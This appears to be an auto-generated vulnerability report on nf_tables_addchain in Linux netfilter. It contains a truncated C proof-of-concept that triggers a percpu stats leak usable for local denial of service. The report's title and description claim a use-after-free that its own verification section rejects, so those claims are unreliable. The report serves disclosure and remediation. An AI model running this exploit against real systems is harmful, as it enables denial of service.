# [MEDIUM] Use After Free in nf_tables_addchain (CWE-401)

**Generated:** 2026-03-06T03:59:44.177608+00:00  
**Report ID:** `nf_tables_addchain_2508a9e0`

## Location

| Field | Value |
|---|---|
| File | `net/netfilter/nf_tables_api.c` |
| Function | `nf_tables_addchain` |
| Line | 1990 |
| Subsystem | net |

## Source Code

```c
 1990 | static int nf_tables_addchain(struct nft_ctx *ctx, u8 family, u8 genmask,
 1991 | 			      u8 policy, u32 flags)
 1992 | {
 1993 | 	const struct nlattr * const *nla = ctx->nla;
 1994 | 	struct nft_table *table = ctx->table;
 1995 | 	struct nft_base_chain *basechain;
 1996 | 	struct nft_stats __percpu *stats;
 1997 | 	struct net *net = ctx->net;
 1998 | 	char name[NFT_NAME_MAXLEN];
 1999 | 	struct nft_trans *trans;
 2000 | 	struct nft_chain *chain;
 2001 | 	struct nft_rule **rules;
 2002 | 	int err;
 2003 | 
 2004 | 	if (table->use == UINT_MAX)
 2005 | 		return -EOVERFLOW;
 2006 | 
 2007 | 	if (nla[NFTA_CHAIN_HOOK]) {
 2008 | 		struct nft_chain_hook hook;
 2009 | 
 2010 | 		if (flags & NFT_CHAIN_BINDING)
 2011 | 			return -EOPNOTSUPP;
 2012 | 
 2013 | 		err = nft_chain_parse_hook(net, nla, &hook, family, true);
 2014 | 		if (err < 0)
 2015 | 			return err;
 2016 | 
 2017 | 		basechain = kzalloc(sizeof(*basechain), GFP_KERNEL);
 2018 | 		if (basechain == NULL) {
 2019 | 			nft_chain_release_hook(&hook);
 2020 | 			return -ENOMEM;
 2021 | 		}
 2022 | 		chain = &basechain->chain;
 2023 | 
 2024 | 		if (nla[NFTA_CHAIN_COUNTERS]) {
 2025 | 			stats = nft_stats_alloc(nla[NFTA_CHAIN_COUNTERS]);
 2026 | 			if (IS_ERR(stats)) {
 2027 | 				nft_chain_release_hook(&hook);
 2028 | 				kfree(basechain);
 2029 | 				return PTR_ERR(stats);
 2030 | 			}
 2031 | 			rcu_assign_pointer(basechain->stats, stats);
 2032 | 			static_branch_inc(&nft_counters_enabled);
 2033 | 		}
 2034 | 
 2035 | 		err = nft_basechain_init(basechain, family, &hook, flags);
 2036 | 		if (err < 0) {
 2037 | 			nft_chain_release_hook(&hook);
 2038 | 			kfree(basechain);
 2039 | 			return err;
 2040 | 		}
 2041 | 	} else {
 2042 | 		if (flags & NFT_CHAIN_BASE)
 2043 | 			return -EINVAL;
 2044 | 		if (flags & NFT_CHAIN_HW_OFFLOAD)
 2045 | 			return -EOPNOTSUPP;
 2046 | 
 2047 | 		chain = kzalloc(sizeof(*chain), GFP_KERNEL);
 2048 | 		if (chain == NULL)
 2049 | 			return -ENOMEM;
 2050 | 
 2051 | 		chain->flags = flags;
 2052 | 	}
 2053 | 	ctx->chain = chain;
 2054 | 
 2055 | 	INIT_LIST_HEAD(&chain->rules);
 2056 | 	chain->handle = nf_tables_alloc_handle(table);
 2057 | 	chain->table = table;
 2058 | 
 2059 | 	if (nla[NFTA_CHAIN_NAME]) {
 2060 | 		chain->name = nla_strdup(nla[NFTA_CHAIN_NAME], GFP_KERNEL);
 2061 | 	} else {
 2062 | 		if (!(flags & NFT_CHAIN_BINDING)) {
 2063 | 			err = -EINVAL;
 2064 | 			goto err_destroy_chain;
 2065 | 		}
 2066 | 
 2067 | 		snprintf(name, sizeof(name), "__chain%llu", ++chain_id);
 2068 | 		chain->name = kstrdup(name, GFP_KERNEL);
 2069 | 	}
 2070 | 
 2071 | 	if (!chain->name) {
 2072 | 		err = -ENOMEM;
 2073 | 		goto err_destroy_chain;
 2074 | 	}
 2075 | 
 2076 | 	if (nla[NFTA_CHAIN_USERDATA]) {
 2077 | 		chain->udata = nla_memdup(nla[NFTA_CHAIN_USERDATA], GFP_KERNEL);
 2078 | 		if (chain->udata == NULL) {
 2079 | 			err = -ENOMEM;
 2080 | 			goto err_destroy_chain;
 2081 | 		}
 2082 | 		chain->udlen = nla_len(nla[NFTA_CHAIN_USERDATA]);
 2083 | 	}
 2084 | 
 2085 | 	rules = nf_tables_chain_alloc_rules(chain, 0);
 2086 | 	if (!rules) {
 2087 | 		err = -ENOMEM;
 2088 | 		goto err_destroy_chain;
 2089 | 	}
 2090 | 
 2091 | 	*rules = NULL;
 2092 | 	rcu_assign_pointer(chain->rules_gen_0, rules);
 2093 | 	rcu_assign_pointer(chain->rules_gen_1, rules);
 2094 | 
 2095 | 	err = nf_tables_register_hook(net, table, chain);
 2096 | 	if (err < 0)
 2097 | 		goto err_destroy_chain;
 2098 | 
 2099 | 	trans = nft_trans_chain_add(ctx, NFT_MSG_NEWCHAIN);
 2100 | 	if (IS_ERR(trans)) {
 2101 | 		err = PTR_ERR(trans);
 2102 | 		goto err_unregister_hook;
 2103 | 	}
 2104 | 
 2105 | 	nft_trans_chain_policy(trans) = NFT_CHAIN_POLICY_UNSET;
 2106 | 	if (nft_is_base_chain(chain))
 2107 | 		nft_trans_chain_policy(trans) = policy;
 2108 | 
 2109 | 	err = nft_chain_add(table, chain);
 2110 | 	if (err < 0) {
 2111 | 		nft_trans_destroy(trans);
 2112 | 		goto err_unregister_hook;
 2113 | 	}
 2114 | 
 2115 | 	table->use++;
 2116 | 
 2117 | 	return 0;
 2118 | err_unregister_hook:
 2119 | 	nf_tables_unregister_hook(net, table, chain);
 2120 | err_destroy_chain:
 2121 | 	nf_tables_chain_destroy(ctx);
 2122 | 
 2123 | 	return err;
 2124 | }
```

## Classification

| Metric | Value |
|---|---|
| Severity | **MEDIUM** |
| CVSS Score | 4.4 |
| CWE | CWE-401 |
| Type | use_after_free |
| Attack Vector | LOCAL |
| Attack Complexity | LOW |
| Privileges Required | HIGH |
| User Interaction | NONE |
| Exploitability | LOW |

## Description

There is a Use-After-Free vulnerability in the error handling path of `nf_tables_addchain`. At line 2035, `nft_basechain_init()` is called with `basechain`. If it fails (err < 0 at line 2036), the error path at lines 2037-2039 calls `nft_chain_release_hook(&hook)` and `kfree(basechain)` directly — this is correct for the hook path. However, the critical UAF exists in the shared `err_destroy_chain` error label at line 2120, which calls `nf_tables_chain_destroy(ctx)`. The `ctx->chain` pointer is set at line 2053 to point to `chain` (which is `&basechain->chain` for the base chain case). If `nft_basechain_init` succeeds but a later allocation fails (e.g., `nla_strdup` at line 2060 fails, or `nf_tables_chain_alloc_rules` at line 2085 fails), the code jumps to `err_destroy_chain` which calls `nf_tables_chain_destroy(ctx)`. Meanwhile, the `stats` pointer has already been stored via `rcu_assign_pointer(basechain->stats, stats)` at line 2031, and `static_branch_inc(&nft_counters_enabled)` has been called. If `nft_basechain_init` stored references into global/shared structures and `nf_tables_chain_destroy` does not properly clean these up — or if the `stats` __percpu allocation's reference is tracked incorrectly — a double-free or UAF can occur on the stats percpu data. More critically: the `chain_id` counter at line 2067 (`++chain_id`) is a global variable incremented without any lock visible in this function, creating a TOCTOU/race on `chain_id` in concurrent chain creation. The most severe issue is the stats counter leak + possible double-free: when `nla[NFTA_CHAIN_COUNTERS]` is set (line 2024), `stats` is allocated and assigned via `rcu_assign_pointer`, and `static_branch_inc` is called. If `nft_basechain_init` then fails at line 2036, the code at lines 2037-2039 calls `kfree(basechain)` but does NOT call `free_percpu(stats)` or `static_branch_dec(&nft_counters_enabled)`. This leaks the percpu stats allocation and permanently increments the static branch counter — a resource exhaustion/logic corruption primitive. Additionally, `nf_tables_chain_destroy(ctx)` at the `err_destroy_chain` label is called with `ctx->chain` pointing to an already-kfreed `basechain` (from the `nft_basechain_init` failure path at line 2038-2039) if any subsequent code somehow reaches `err_destroy_chain` — but careful reading shows those early returns avoid `err_destroy_chain`. However, the stats leak on `nft_basechain_init` failure IS confirmed.

## Impact

Resource leak: percpu stats allocation freed on nft_basechain_init failure path (lines 2036-2039) does not call free_percpu(stats) or static_branch_dec(&nft_counters_enabled). Repeated exploitation causes percpu memory exhaustion and permanent static branch counter increment, leading to DoS. The UAF claim in the primary report is NOT confirmed; early returns at lines 2036-2039 prevent reaching err_destroy_chain, so no double-free occurs.

## Attack Path

```
userspace → socket(AF_NETLINK) → sendmsg(NFNL_MSG_BATCH_BEGIN + NFT_MSG_NEWCHAIN) → nfnetlink_rcv_batch → nf_tables_newchain → nf_tables_addchain → [NFTA_CHAIN_HOOK present, NFTA_CHAIN_COUNTERS present] → nft_stats_alloc succeeds → rcu_assign_pointer(basechain->stats) + static_branch_inc → nft_basechain_init fails → kfree(basechain) WITHOUT free_percpu(stats) or static_branch_dec → percpu stats leak + static branch counter corruption
```

## Check-Bypass Analysis

1. The caller `nf_tables_newchain` does validate that the table exists and the user has CAP_NET_ADMIN, but these checks do not prevent the logic errors inside `nf_tables_addchain`. 2. The `table->use == UINT_MAX` check at line 2004 prevents integer overflow on `table->use++` at line 2115 — this check is correct but only guards one integer. 3. The `chain_id` increment at line 2067 (`++chain_id`) appears to be a global u64 without any mutex protection visible in this function — concurrent NFT_MSG_NEWCHAIN requests with NFT_CHAIN_BINDING flags and no NFTA_CHAIN_NAME could race on `chain_id`, though this is lower severity since chain_id is just a name counter. 4. The `nla_strdup` result is checked (line 2071) but the stats/basechain allocated earlier is freed via `err_destroy_chain → nf_tables_chain_destroy(ctx)`. At this point `ctx->chain = chain = &basechain->chain`, so `nf_tables_chain_destroy` will attempt to free the basechain again if it uses `nft_is_base_chain` to detect and free the basechain struct — this could be a double-free if `nft_chain_destroy` internally frees the basechain. Need `nf_tables_chain_destroy` source to confirm. 5. The `static_branch_inc` at line 2032 is not paired with `static_branch_dec` in the `nft_basechain_init` failure path (lines 2036-2039), creating a permanent counter imbalance exploitable for denial-of-service by repeated failed chain creations.

## Verification

**Status:** ✓ CONFIRMED  
**Verifier Confidence:** HIGH

Confirmed resource leak: when nla[NFTA_CHAIN_COUNTERS] is present and nft_stats_alloc succeeds (lines 2024-2033), both rcu_assign_pointer(basechain->stats, stats) and static_branch_inc(&nft_counters_enabled) are called. If nft_basechain_init subsequently fails (line 2036), the error path at lines 2037-2039 calls kfree(basechain) but does not call free_percpu(stats) nor static_branch_dec(&nft_counters_enabled), leaking the percpu allocation and permanently imbalancing the static branch counter. The primary agent's UAF claim is not supported: lines 2037-2039 return early and never reach err_destroy_chain, so no double-free of basechain occurs. Requires CAP_NET_ADMIN (or equivalent in user namespace) to reach nf_tables_addchain.

## Proof of Concept

See raw code below

```c
/* This proof-of-concept is generated for AUTHORIZED SECURITY RESEARCH ONLY.
 * Do NOT use this code on any system without explicit written permission.
 * Handle responsibly: report findings via coordinated disclosure.
 */

```json
{
    "code": "/*\n * CVE PoC: nf_tables_addchain percpu stats leak\n * CWE-401: Missing Release of Memory After Effective Lifetime\n *\n * The bug: when NFTA_CHAIN_COUNTERS is present and nft_stats_alloc() succeeds,\n * rcu_assign_pointer(basechain->stats, stats) and static_branch_inc() are called.\n * If nft_basechain_init() then fails, the error path does\n * kfree(basechain) but NEVER calls free_percpu(stats) or\n * static_branch_dec(&nft_counters_enabled).\n *\n * Strategy to trigger nft_basechain_init failure:\n *   Use NFPROTO_NETDEV with a non-existent device name so that\n *   nft_basechain_init returns -ENODEV after stats are allocated.\n *\n * Build:  gcc -o poc poc.c\n * Run:    ./poc  (needs CAP_NET_ADMIN or user-ns with net caps)\n * Watch:  dmesg | tail -30\n *         echo scan > /sys/kernel/debug/kmemleak\n *         cat /sys/kernel/debug/kmemleak\n */\n\n#define _GNU_SOURCE\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <stdint.h>\n#include <arpa/inet.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <linux/netlink.h>\n#include <linux/netfilter.h>\n#include <linux/netfilter/nfnetlink.h>\n#include <linux/netfilter/nf_tables.h>\n\n#ifndef NFPROTO_INET\n#define NFPROTO_INET   1\n#endif\n#ifndef NFPROTO_NETDEV\n#define NFPROTO_NETDEV 5\n#endif\n\n#define NLMSG_TAIL(nmsg) \\\n    ((struct nlattr *)(((char *)(nmsg)) + NLMSG_ALIGN((nmsg)->nlmsg_len)))\n\nstatic void nla_put_raw(struct nlmsghdr *nlh, int type, int len, const void *data)\n{\n    struct nlattr *nla = NLMSG_TAIL(nlh);\n    int nla_len = NLA_HDRLEN + len;\n    nla->nla_type = type;\n    nla->nla_len  = (uint16_t)nla_len;\n    memcpy((char *)nla + NLA_HDRLEN, data, len);\n    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + NLA_ALIGN(nla_len);\n}\n\nstatic struct nlattr *nla_nest_start(struct nlmsghdr *nlh, int type)\n{\n    struct nlattr *nla = NLMSG_TAIL(nlh);\n    nla->nla_type = type;\n    nla->nla_len  = NLA_HDRLEN;\n    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + NLA_HDRLEN;\n    return nla;\n}\n\nstatic void nla_nest_end(struct nlmsghdr *nlh, struct nlattr *nla)\n{\n    nla->nla_len = (uint16_t)((char *)NLMSG_TAIL(nlh) - (char *)nla);\n}\n\nstatic void nla_put_u32(struct nlmsghdr *nlh, int type, uint32_t val)\n{\n    nla_put_raw(nlh, type, sizeof(val), &val);\n}\n\nstatic void nla_put_u64(struct nlmsghdr *nlh, int type, uint64_t val)\n{\n    nla_put_raw(nlh, type, sizeof(val), &val);\n}\n\nstatic void nla_put_str(struct nlmsghdr *nlh, int type, const char *str)\n{\n    nla_put_raw(nlh, type, (int)(strlen(str) + 1), str);\n}\n\nstatic int open_nfnl_sock(void)\n{\n    struct sockaddr_nl sa;\n    int fd;\n\n    fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);\n    if (fd < 0) {\n        perror(\"socket(NETLINK_NETFILTER)\");\n        return -1;\n    }\n    memset(&sa, 0, sizeof(sa));\n    sa.nl_family = AF_NETLINK;\n    if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {\n        perror(\"bind\");\n        close(fd);\n        return -1;\n    }\n    return fd;\n}\n\nstatic int send_nlmsg(int fd, struct nlmsghdr *nlh)\n{\n    struct sockaddr_nl sa;\n    struct iovec iov;\n    struct msghdr msg;\n\n    memset(&sa, 0, sizeof(sa));\n    sa.nl_family = AF_NETLINK;\n\n    iov.iov_base = nlh;\n    iov.iov_len  = nlh->nlmsg_len;\n\n    memset(&msg, 0, sizeof(msg));\n    msg.msg_name    = &sa;\n    msg.msg_namelen = sizeof(sa);\n    msg.msg_iov     = &iov;\n    msg.msg_iovlen  = 1;\n\n    if (sendmsg(fd, &msg, 0) < 0) {\n        perror(\"sendmsg\");\n        return -1;\n    }\n    return 0;\n}\n\nstatic int recv_ack(int fd, const char *label)\n{\n    char rxbuf[4096];\n    struct sockaddr_nl sa;\n    struct iovec rxiov;\n    struct msghdr rxmsg;\n    struct nlmsghdr *rnlh;\n    ssize_t n;\n\n    memset(&sa, 0, sizeof(sa));\n    sa.nl_family = AF_NETLINK;\n    rxiov.iov_base = rxbuf;\n    rxiov.iov_len  = sizeof(rxbuf);\n    memset(&rxmsg, 0, sizeof(rxmsg));\n    rxmsg.msg_name    = &sa;\n    rxmsg.msg_namelen = sizeof(sa);\n    rxmsg.msg_iov     = &rxiov;\n    rxmsg.msg_iovlen  = 1;\n\n    n = recvmsg(fd, &rxmsg, 0);\n    if (n < 0) {\n        perror(\"recvmsg\");\n        return -1;\n    }\n\n    rnlh = (struct nlmsghdr *)rxbuf;\n    if (rnlh->nlmsg_type == NLMSG_ERROR) {\n        struct nlmsgerr *err = (struct nlmsgerr *)NLMSG_DATA(rnlh);\n        if (err->error == 0) {\n            fprintf(stdout, \"[%s] ACK (success)\\n\", label);\n            return 0;\n        } else {\n            /* negative errno stored in err->error */\n            int e = err->error < 0 ? -err->error : err->error;\n            fprintf(stdout, \"[%s] kernel returned error: %s (%d)\\n\",\n                    label, strerror(e), err->error);\n            return err->error;\n        }\n    }\n    return 0;\n}\n\n/*\n * Create an nftables table via NFT_MSG_NEWTABLE.\n */\nstatic int create_table(int fd, const char *table_name, uint8_t family)\n{\n    char buf[512];\n    struct nlmsghdr *nlh;\n    struct nfgenmsg *nfg;\n    int ret;\n\n    memset(buf, 0, sizeof(buf));\n    nlh = (struct nlmsghdr *)buf;\n    nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(*nfg));\n    nlh->nlmsg_type  = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE;\n    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE;\n    nlh->nlmsg_seq   = 1;\n    nlh->nlmsg_pid   = (uint32_t)getpid();\n\n    nfg = (struct nfgenmsg *)NLMSG_DATA(nlh);\n    nfg->nfgen_family = family;\n    nfg->version      = NFNETLINK_V0;\n    nfg->res_id       = 0;\n\n    nla_put_str(nlh, NFTA_TABLE_NAME, table_name);\n\n    if (send_nlmsg(fd, nlh) < 0)\n        return -1;\n\n    ret = recv_ack(fd, \"NEWTABLE\");\n    /* -EEXIST is OK - table already exists */\n    if (ret != 0 && ret != -EEXIST)\n        return -1;\n    return 0;\n}\n\n/*\n * Trigger the leak:\n *   Send NFT_MSG_NEWCHAIN with NFTA_CHAIN_COUNTERS (triggers nft_stats_alloc)\n *   AND a hook that causes nft_basechain_init to fail (non-existent device\n *   for NFPROTO_NETDEV, or invalid hooknum for other families).\n *\n *   We WANT the kernel to reject the message -- that proves the buggy error\n *   path was hit (stats allocated but never freed).\n */\nstatic int trigger_leak(int fd, const char *table_name, const char *chain_name,\n                        uint8_t family, uint32_t hooknum, uint32_t priority,\n                        const char *devname)\n{\n    char buf[2048];\n    struct nlmsghdr  *nlh;\n    struct nfgenmsg  *nfg;\n    struct nlattr    *hook_attr;\n    struct nlattr    *counter_attr;\n    int ret;\n\n    memset(buf, 0, sizeof(buf));\n    nlh = (struct nlmsghdr *)buf;\n    nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(*nfg));\n    nlh->nlmsg_type  = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWCHAIN;\n    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE;\n    nlh->nlmsg_seq   = 2;\n    nlh->nlmsg_pid   = (uint32_t)getpid();\n\n    nfg = (struct nfgenmsg *)NLMSG_DATA(nlh);\n    nfg->nfgen_family = family;\n    nfg->version      = NFNETLINK_V0;\n    nfg->res_id       = 0;\n\n    nla_put_str(nlh, NFTA_CHAIN_TABLE, table_name);\n    nla_put_str(nlh, NFTA_CHAIN_NAME,  chain_name);\n    nla_put_str(nlh, NFTA_CHAIN_TYPE,  \"filter\");\n\n    /* Build NFTA_CHAIN_HOOK nested attribute */\n    hook_attr = nla_nest_start(nlh, NFTA_CHAIN_HOOK);\n    nla_put_u32(nlh, NFTA_HOOK_HOOKNUM,  htonl(hooknum));\n    nla_put_u32(nlh, NFTA_HOOK_PRIORITY, htonl(priority));\n    if (devname) {\n        /*\n         * For NFPROTO_NETDEV: a non-existent device name makes\n         * nft_basechain_init fail with -ENODEV *after* stats are\n         * allocated, triggering the leak.\n         */\n        nla_put_str(nlh, NFTA_HOOK_DEV, devname);\n    }\n    nla_nest_end(nlh, hook_attr);\n\n    /*\n     * Build NFTA_CHAIN_COUNTERS nested attribute.\n     * Presence of this attribute causes nft_stats_alloc() to be called\n     * inside nf_tables_addchain.  If the subsequent nft_basechain_init\n     * fails, the percpu stats memory is never freed (the bug).\n     */\n    counter_attr = nla_nest_start(nlh, NFTA_CHAIN_COUNTERS);\n    nla_put_u64(nlh, NFTA_COUNTER_BYTES,   0);\n    nla_put_u64(nlh, NFTA_COUNTER_PACKETS, 0);\n    nla_nest_end(nlh, counter_attr);\n\n    if (send_nlmsg(fd, nlh) < 0)\n        return -1;\n\n    ret = recv_ack(fd, \"NEWCHAIN\");\n    if (ret < 0) {\n        /*\n         * A kernel error here is *expected* and *desired*:\n         * it means nft_basechain_init failed while stats were already\n         * allocated -- the leak has been triggered.\n         */\n        fprintf(stdout,\n                \"[TRIGGERED] NEWCHAIN rejected by kernel after stats alloc.\\n\"\n                \"  percpu stats leaked, static_branch counter incremented.\\n\"\n                \"  Run: echo scan > /sys/kernel/debug/kmemleak && \"\n                \"cat /sys/kernel/debug/kmemleak\\n\");\n        return 1;  /* 1 = leak triggered */\n    }\n    /* Unexpected success - chain was created, no leak this round */\n    fprintf(stdout, \"[WARN] NEWCHAIN succeeded unexpectedly (no leak this round).\\n\");\n    return 0;\n}\n\nint main(void)\n{\n    int fd;\n    int triggered = 0;\n    int i;\n\n    /*\n     * Use a user namespace so we don't need real root.\n     * On most modern distros: unshare(1) or clone with CLONE_NEWUSER|CLONE_NEWNET.\n     * For simplicity this PoC assumes CAP_NET_ADMIN is available\n     * (e.g. run inside: unshare -rn ./poc)\n     */\n    fd = open_nfnl_sock();\n    if (fd < 0)\n        return 1;\n\n    /*\n     * Create a table in the NETDEV family.\n     * NETDEV chains require a real device; we will supply a fake one.\n     */\n    if (create_table(fd, \"poc_table\", NFPROTO_NETDEV) < 0) {\n        fprintf(stderr, \"Failed to create table (need CAP_NET_ADMIN / net namespace)\\n\");\n
```

**Expected kernel output:**
```
unknown
```

**Limitations:** Parse error — review raw output

## Remediation

In the nft_basechain_init failure path (lines 2036-2039), add: if (basechain->stats) { free_percpu(basechain->stats); static_branch_dec(&nft_counters_enabled); } before kfree(basechain). Alternatively, refactor error cleanup to use a unified label that handles stats deallocation.

---
*Graph vulnerability score: 12.84 | Betweenness: 0.0000 | PageRank: 0.001414*
